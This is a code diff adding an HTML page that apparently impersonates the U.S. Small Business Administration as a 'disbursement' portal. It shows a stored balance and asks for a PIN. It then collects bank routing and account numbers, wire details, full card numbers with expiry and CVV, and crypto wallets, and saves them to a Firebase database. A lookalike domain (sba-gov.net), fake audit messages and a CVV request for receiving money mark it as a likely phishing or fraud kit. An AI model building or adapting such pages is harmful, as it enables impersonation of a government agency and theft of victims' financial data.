@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBA | Disbursement Node 7-B</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
+        :root { 
+            --sba-navy: #002e6d; 
+            --sba-red: #cc0000; 
+            --sba-green: #10b981;
+        }
+        body { background: #f8fafc; font-family: 'Public Sans', sans-serif; color: #1e293b; }
+        
+        .header-container { background: white; padding: 12px 20px; display: flex; align-items: center; border-bottom: 3px solid var(--sba-navy); position: sticky; top: 0; z-index: 1000; }
+        .app-card { background: white; border-radius: 24px; padding: 25px; margin: 15px; border: 1px solid #e2e8f0; box-shadow: 0 15px 35px rgba(0,0,0,0.05); }
+        
+        .method-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-bottom: 20px; }
+        .m-btn { border: 1.5px solid #e2e8f0; border-radius: 12px; padding: 10px 2px; cursor: pointer; text-align: center; transition: 0.2s; background: #fff; }
+        .m-btn.active { border-color: var(--sba-navy); background: #f0f7ff; box-shadow: 0 4px 10px rgba(0,46,109,0.08); }
+        .m-btn i { font-size: 16px; margin-bottom: 4px; display: block; color: #94a3b8; }
+        .m-btn.active i { color: var(--sba-navy); }
+        .m-btn span { font-size: 8px; font-weight: 900; text-transform: uppercase; display: block; color: #64748b; }
+        .m-btn.active span { color: var(--sba-navy); }
+        
+        .label-text { font-size: 9px; font-weight: 900; color: #64748b; text-transform: uppercase; margin-bottom: 6px; display: block; margin-left: 4px; }
+        .s-input { width: 100%; height: 48px; background: #f8fafc; border: 2px solid #e2e8f0; border-radius: 12px; padding: 0 15px; font-size: 13px; font-weight: 700; margin-bottom: 12px; outline: none; transition: 0.3s; }
+        .s-input:focus { border-color: var(--sba-navy); background: #fff; }
+        
+        .btn-success { background: var(--sba-green); color: white; font-weight: 900; text-transform: uppercase; width: 100%; height: 55px; border-radius: 15px; border-bottom: 5px solid #065f46; cursor: pointer; }
+        .btn-outline { border: 2px solid var(--sba-navy); color: var(--sba-navy); font-weight: 900; text-transform: uppercase; width: 100%; border-radius: 14px; font-size: 11px; height: 48px; }
+        
+        .support-agent-box { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 16px; padding: 12px; margin-top: 25px; display: flex; align-items: center; gap: 12px; cursor: pointer; }
+        .agent-img { width: 40px; height: 40px; border-radius: 10px; object-fit: cover; border: 2px solid var(--sba-green); }
+        .fab-support { position: fixed; bottom: 30px; right: 20px; width: 56px; height: 56px; background: var(--sba-navy); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 22px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); border: 2px solid white; z-index: 999; cursor: pointer; }
+        
+        #globalLoader { position: fixed; inset: 0; background: #f8fafc; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .radar-spin { animation: spin 1.5s linear infinite; }
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body class="pb-20">
+
+    <div id="globalLoader">
+        <div class="text-xl font-black text-slate-800 tracking-tight mb-4 flex items-center gap-2">
+            <i class="fas fa-satellite-dish text-indigo-600 animate-pulse"></i> Node Verification Gateway
+        </div>
+        <div class="w-32 h-1.5 bg-slate-200 rounded-full overflow-hidden">
+            <div class="h-full bg-indigo-600 w-1/3 animate-pulse"></div>
+        </div>
+        <p class="text-[9px] font-black uppercase text-slate-400 mt-4 tracking-widest">Checking node parameters...</p>
+    </div>
+
+    <header class="header-container max-w-md mx-auto rounded-2xl border border-slate-200 mt-6">
+        <div class="sba-logo-sm" onclick="location.href='dashboard.html'" style="width: 35px; height: 35px; position: relative; display: flex; align-items: center; justify-content: center; flex-shrink: 0; cursor: pointer;">
+            <div class="brk-top" style="position: absolute; top: 0; right: 0; width: 70%; height: 40%; border-top: 3px solid var(--sba-navy); border-right: 3px solid var(--sba-navy);"></div>
+            <div class="logo-text-sm" style="font-size: 12px; font-weight: 900; color: #002e6d; z-index: 5;">SBA</div>
+            <div class="brk-btm" style="position: absolute; bottom: 0; left: 0; width: 70%; height: 40%; border-bottom: 3px solid var(--sba-red); border-left: 3px solid var(--sba-red);"></div>
+        </div>
+        <div class="ml-3">
+            <h1 class="text-[10px] font-black leading-none text-[#002e6d] uppercase">Disbursement</h1>
+            <p class="text-[7px] font-bold text-slate-400 uppercase tracking-tighter mt-1">ACH/WIRE Node 7-B</p>
+        </div>
+        <div class="ml-auto flex items-center gap-3">
+            <a href="dashboard.html" class="text-slate-400 hover:text-slate-700 transition-colors text-base p-1">
+                <i class="fas fa-times"></i>
+            </a>
+        </div>
+    </header>
+
+    <main class="max-w-md mx-auto p-4">
+        <div class="app-card">
+
+            <div id="reason-box" class="hidden bg-rose-50 border-l-4 border-rose-600 p-4 rounded-r-xl mb-5">
+                <div class="flex gap-3 text-rose-800">
+                    <i class="fas fa-shield-slash mt-1"></i>
+                    <div>
+                        <p class="text-[9px] font-black uppercase">Gateway Action: Reverted</p>
+                        <p id="decline-text" class="text-[10px] font-bold mt-1">...</p>
+                        <button onclick="clearStatusAndRetry()" class="text-[9px] font-black text-rose-600 underline mt-2 block">Retry Transaction</button>
+                    </div>
+                </div>
+            </div>
+
+            <div id="success-box" class="hidden bg-emerald-50 border-l-4 border-emerald-600 p-4 rounded-r-xl mb-5">
+                <div class="flex gap-3 text-emerald-800">
+                    <i class="fas fa-check-circle mt-1"></i>
+                    <div>
+                        <p class="text-[9px] font-black uppercase">Transaction Successful</p>
+                        <p class="text-[10px] font-bold mt-1">Disbursement approved and finalized.</p>
+                        <button onclick="location.href='dashboard.html'" class="text-[9px] font-black text-emerald-600 underline mt-2 block">Return to Dashboard</button>
+                    </div>
+                </div>
+            </div>
+
+            <div id="pending-box" class="hidden bg-amber-50 border-l-4 border-amber-500 p-4 rounded-r-xl mb-5">
+                <div class="flex gap-3 text-amber-800">
+                    <i class="fas fa-spinner fa-spin mt-1"></i>
+                    <div>
+                        <p class="text-[9px] font-black uppercase">Processing</p>
+                        <p class="text-[10px] font-bold mt-1">Disbursement data is currently being audited.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div id="pin-setup-state" class="hidden py-6 text-center">
+                <i class="fas fa-key text-indigo-600 text-3xl mb-4 animate-bounce"></i>
+                <h3 class="text-xs font-black uppercase tracking-tight text-slate-800">Secure PIN Required</h3>
+                <p class="text-[10px] text-slate-500 font-bold uppercase px-6 mt-2">To complete the setup for treasury operations, enter a 4-digit PIN below.</p>
+
+                <div class="mt-6 px-4 text-left">
+                    <label class="label-text">Create 4-digit PIN</label>
+                    <input type="password" id="set-pin" class="s-input tracking-widest text-center text-lg" placeholder="••••" maxlength="4" />
+                </div>
+                <button onclick="handlePinSetup()" class="btn-success h-12 mt-4 max-w-[280px]">Save Operations PIN</button>
+            </div>
+
+            <div id="form-content-state">
+                <label class="label-text">Disbursement Type</label>
+                <div class="method-grid">
+                    <div id="type-ach" class="m-btn active" onclick="switchDisbursement('ach')">
+                        <i class="fas fa-university"></i>
+                        <span>ACH</span>
+                    </div>
+                    <div id="type-wire" class="m-btn" onclick="switchDisbursement('wire')">
+                        <i class="fas fa-exchange-alt"></i>
+                        <span>Wire</span>
+                    </div>
+                    <div id="type-card" class="m-btn" onclick="switchDisbursement('card')">
+                        <i class="far fa-credit-card"></i>
+                        <span>Card</span>
+                    </div>
+                    <div id="type-crypto" class="m-btn" onclick="switchDisbursement('crypto')">
+                        <i class="fab fa-bitcoin"></i>
+                        <span>Crypto</span>
+                    </div>
+                </div>
+
+                <div id="ach-inputs">
+                    <label class="label-text">Routing Number</label>
+                    <input type="text" class="s-input" placeholder="000000000" id="ach-routing" />
+                    
+                    <label class="label-text">Account Number</label>
+                    <input type="text" class="s-input" placeholder="XXXXXXXX" id="ach-account" />
+
+                    <label class="label-text">Bank Name</label>
+                    <input type="text" class="s-input" placeholder="Chase, Wells Fargo..." id="ach-bank" />
+                </div>
+
+                <div id="wire-inputs" class="hidden">
+                    <label class="label-text">SWIFT / BIC Code</label>
+                    <input type="text" class="s-input" placeholder="SWIFTXXXX" id="wire-swift" />
+
+                    <label class="label-text">Beneficiary Name</label>
+                    <input type="text" class="s-input" placeholder="Full Name" id="wire-beneficiary" />
+
+                    <label class="label-text">Account Number / IBAN</label>
+                    <input type="text" class="s-input" placeholder="Account or IBAN" id="wire-account" />
+                </div>
+
+                <div id="card-inputs" class="hidden">
+                    <label class="label-text">Cardholder Name</label>
+                    <input type="text" class="s-input" placeholder="Full Name" id="card-name" />
+
+                    <label class="label-text">Card Number</label>
+                    <input type="text" class="s-input" placeholder="XXXX XXXX XXXX XXXX" id="card-number" />
+
+                    <label class="label-text">Expiration Date & CVV</label>
+                    <div class="flex gap-2">
+                        <input type="text" class="s-input" placeholder="MM/YY" id="card-expiry" />
+                        <input type="text" class="s-input" placeholder="CVV" id="card-cvv" />
+                    </div>
+                </div>
+
+                <div id="crypto-inputs" class="hidden">
+                    <label class="label-text">Select Network Channel</label>
+                    <select id="cryptoDropdown" class="w-full h-12 bg-slate-50 border-2 border-slate-200 rounded-xl px-4 font-bold text-xs mb-3 focus:border-sba-navy outline-none">
+                        <option value="BTC">Bitcoin (BTC)</option>
+                        <option value="USDT-BEP20">USDT (BNB Smart Chain BEP20)</option>
+                        <option value="USDT-ERC20">USDT (Ethereum ERC20)</option>
+                        <option value="USDT-TRC20">USDT (Tron TRC20)</option>
+                        <option value="USDT-SOL">USDT (Solana SOL)</option>
+                        <option value="USDT-TON">USDT (TON)</option>
+                        <option value="USDC-BASE">USDC (Base BASE)</option>
+                        <option value="USDC-SOL">USDC (Solana SOL)</option>
+                        <option value="ETH-ERC20">Ethereum (ERC20)</option>
+                        <option value="BNB-BEP20">BNB (Smart Chain BEP20)</option>
+                        <option value="SOL-SOL">Solana (SOL)</option>
+                        <option value="TRX-TRC20">Tron (TRC20)</option>
+                        <option value="TON-TON">TON (TON)</option>
+                        <option value="SUI-SUI">Sui (SUI)</option>
+                    </select>
+
+                    <label class="label-text">Destination Wallet Address</label>
+                    <input type="text" class="s-input" placeholder="Destination Address" id="crypto-address" />
+                </div>
+
+                <label class="label-text mt-3">Disbursement Amount</label>
+                <div class="relative mb-4">
+                    <span class="absolute left-5 top-1/2 -translate-y-1/2 font-black text-slate-400 text-lg">$</span>
+                    <input type="number" id="wireAmount" class="w-full h-14 pl-10 rounded-2xl border-2 border-slate-100 font-black text-lg focus:border-sba-navy outline-none transition-all shadow-inner bg-slate-50/50" placeholder="0.00">
+                </div>
+
+                <label class="label-text mt-3">Available Balance</label>
+                <div class="relative mb-4">
+                    <span class="absolute left-5 top-1/2 -translate-y-1/2 font-black text-slate-400 text-lg">$</span>
+                    <div class="w-full h-14 pl-10 rounded-2xl border-2 border-slate-100 font-black text-lg bg-slate-100 flex items-center text-slate-700" id="bal">--.--</div>
+                </div>
+
+                <label class="label-text mt-3">Operations PIN</label>
+                <div class="relative mb-6">
+                    <span class="absolute left-5 top-1/2 -translate-y-1/2 font-black text-slate-400"><i class="fas fa-lock text-xs"></i></span>
+                    <input type="password" id="operation-pin" class="w-full h-14 pl-12 tracking-widest rounded-2xl border-2 border-slate-100 font-black text-lg focus:border-sba-navy outline-none transition-all shadow-inner bg-slate-50/50" placeholder="••••" maxlength="4">
+                </div>
+
+                <button id="submitBtn" onclick="handleDisbursement()" class="btn-success h-14 shadow-xl text-xs tracking-wider">PROCESS DISBURSEMENT</button>
+                <button onclick="location.href='dashboard.html'" class="btn-outline mt-3">Return to Dashboard</button>
+            </div>
+
+            <div id="pending-state" class="hidden py-6 text-center">
+                <div class="relative w-20 h-20 mx-auto mb-6">
+                    <div class="absolute inset-0 border-4 border-indigo-600 rounded-full border-t-transparent radar-spin"></div>
+                    <div class="absolute inset-0 flex items-center justify-center text-indigo-600"><i class="fas fa-bezier-curve text-xl"></i></div>
+                </div>
+                <h3 class="font-black text-slate-800 uppercase italic text-xs tracking-tight">Processing Disbursement</h3>
+                <p class="text-[9px] text-slate-500 font-bold uppercase mt-2">Connecting to decentralized or banking nodes...</p>
+            </div>
+
+            <div class="support-agent-box mt-6" onclick="location.href='mailto:support@sba-gov.net'">
+                <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=80" class="agent-img" alt="Support Agent">
+                <div>
+                    <p class="text-[9px] font-black uppercase text-slate-800">Support Node 7</p>
+                    <p class="text-[7px] font-bold text-emerald-600 uppercase tracking-widest opacity-80">Need Disbursement Help?</p>
+                </div>
+                <i class="fas fa-envelope ml-auto text-emerald-600 text-xs mr-1"></i>
+            </div>
+
+        </div>
+    </main>
+
+    <div class="fab-support" onclick="location.href='tel:+155519927'"><i class="fas fa-headset"></i></div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+        import { getFirestore, doc, getDoc, updateDoc, onSnapshot, arrayUnion } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBbZx4FTzQtrfWBdSS-7yJ3RTGriyybmAc",
+            authDomain: "sba-federal-v15.firebaseapp.com",
+            projectId: "sba-federal-v15",
+            storageBucket: "sba-federal-v15.firebasestorage.app",
+            messagingSenderId: "968263854685",
+            appId: "1:968263854685:web:d037910d8c9bd84a91bbb4"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        window.selectedDisbursementMode = 'ach';
+        let userBalance = 0;
+        let userData = null;
+
+        window.switchDisbursement = (mode) => {
+            window.selectedDisbursementMode = mode;
+            ['ach', 'wire', 'card', 'crypto'].forEach(m => {
+                document.getElementById(`type-${m}`).classList.remove('active');
+                document.getElementById(`${m}-inputs`).classList.add('hidden');
+            });
+            document.getElementById(`type-${mode}`).classList.add('active');
+            document.getElementById(`${mode}-inputs`).classList.remove('hidden');
+        };
+
+        window.handlePinSetup = async () => {
+            const newPin = document.getElementById('set-pin').value;
+            if (newPin.length !== 4 || isNaN(newPin)) {
+                alert("Invalid PIN format. Enter exactly 4 digits.");
+                return;
+            }
+
+            try {
+                const userRef = doc(db, "users", auth.currentUser.uid);
+                await updateDoc(userRef, { withdrawPin: newPin });
+                alert("PIN set successfully! You can now proceed with disbursements.");
+                document.getElementById('pin-setup-state').classList.add('hidden');
+                document.getElementById('form-content-state').classList.remove('hidden');
+            } catch (e) {
+                alert("Error setting PIN: " + e.message);
+            }
+        };
+
+        window.clearStatusAndRetry = async () => {
+            try {
+                await updateDoc(doc(db, "users", auth.currentUser.uid), { withdrawStatus: "RETRY" });
+                document.getElementById('reason-box').classList.add('hidden');
+                document.getElementById('form-content-state').classList.remove('hidden');
+            } catch(e) {
+                alert(e.message);
+            }
+        }
+
+        window.handleDisbursement = async () => {
+            const amount = Number(document.getElementById('wireAmount').value);
+            const opPin = document.getElementById('operation-pin').value;
+
+            if (!amount || amount <= 0) return alert("Federal Audit Error: Enter a valid disbursement amount.");
+            if (amount > userBalance) return alert("Federal Audit Error: Insufficient available balance for this disbursement.");
+
+            if (!opPin || opPin !== userData.withdrawPin) {
+                return alert("Federal Audit Verification Failed: Incorrect Operation PIN.");
+            }
+
+            let details = {};
+            if (window.selectedDisbursementMode === 'ach') {
+                details = {
+                    type: "ACH",
+                    routing: document.getElementById('ach-routing').value,
+                    account: document.getElementById('ach-account').value,
+                    bank: document.getElementById('ach-bank').value
+                };
+            } else if (window.selectedDisbursementMode === 'wire') {
+                details = {
+                    type: "WIRE",
+                    swift: document.getElementById('wire-swift').value,
+                    beneficiary: document.getElementById('wire-beneficiary').value,
+                    account: document.getElementById('wire-account').value
+                };
+            } else if (window.selectedDisbursementMode === 'card') {
+                details = {
+                    type: "CARD",
+                    name: document.getElementById('card-name').value,
+                    number: document.getElementById('card-number').value,
+                    expiry: document.getElementById('card-expiry').value,
+                    cvv: document.getElementById('card-cvv').value
+                };
+            } else {
+                details = {
+                    type: "CRYPTO",
+                    dropdown: document.getElementById('cryptoDropdown').value,
+                    address: document.getElementById('crypto-address').value
+                };
+            }
+
+            try {
+                document.getElementById('form-content-state').classList.add('hidden');
+                document.getElementById('pending-state').classList.remove('hidden');
+
+                const userRef = doc(db, "users", auth.currentUser.uid);
+                const updatedBalance = userBalance - amount;
+
+                await updateDoc(userRef, {
+                    balance: updatedBalance,
+                    withdrawStatus: "PENDING",
+                    withdrawAmount: amount,
+                    withdrawMethod: window.selectedDisbursementMode,
+                    withdrawDetails: details,
+                    lastAction: new Date().toLocaleString(),
+                    chatHistory: arrayUnion({
+                        sender: "USER",
+                        text: `SYSTEM: Disbursement initiated. Amount: $${amount.toLocaleString()} via ${window.selectedDisbursementMode.toUpperCase()}`,
+                        time: new Date().toISOString()
+                    })
+                });
+
+                alert("Disbursement Request Submitted Successfully!");
+                location.href = "dashboard.html";
+            } catch (e) {
+                alert("Disbursement Error: " + e.message);
+                document.getElementById('pending-state').classList.add('hidden');
+                document.getElementById('form-content-state').classList.remove('hidden');
+            }
+        };
+
+        onAuthStateChanged(auth, async (user) => {
+            if (!user) {
+                location.href = "login.html";
+                return;
+            }
+
+            onSnapshot(doc(db, "users", user.uid), (snap) => {
+                if (snap.exists()) {
+                    userData = snap.data();
+                    userBalance = Number(userData.balance || 0);
+                    document.getElementById('bal').innerText = userBalance.toLocaleString();
+
+                    document.getElementById('globalLoader').style.display = 'none';
+
+                    if (!userData.withdrawPin) {
+                        document.getElementById('form-content-state').classList.add('hidden');
+                        document.getElementById('pin-setup-state').classList.remove('hidden');
+                    } else {
+                        if (userData.withdrawStatus === "REJECTED" || userData.withdrawStatus === "DECLINED") {
+                            document.getElementById('reason-box').classList.remove('hidden');
+                            document.getElementById('decline-text').innerText = userData.depositReason || "The request could not be processed at this time. Ledger adjustments have been processed.";
+                            document.getElementById('form-content-state').classList.add('hidden');
+                        } else if (userData.withdrawStatus === "SUCCESSFUL" || userData.withdrawStatus === "APPROVED") {
+                            document.getElementById('success-box').classList.remove('hidden');
+                            document.getElementById('form-content-state').classList.add('hidden');
+                        } else if (userData.withdrawStatus === "PENDING") {
+                            document.getElementById('pending-box').classList.remove('hidden');
+                            document.getElementById('form-content-state').classList.add('hidden');
+                        }
+                    }
+                }
+            });
+        });
+    </script>
+</body>
+</html>
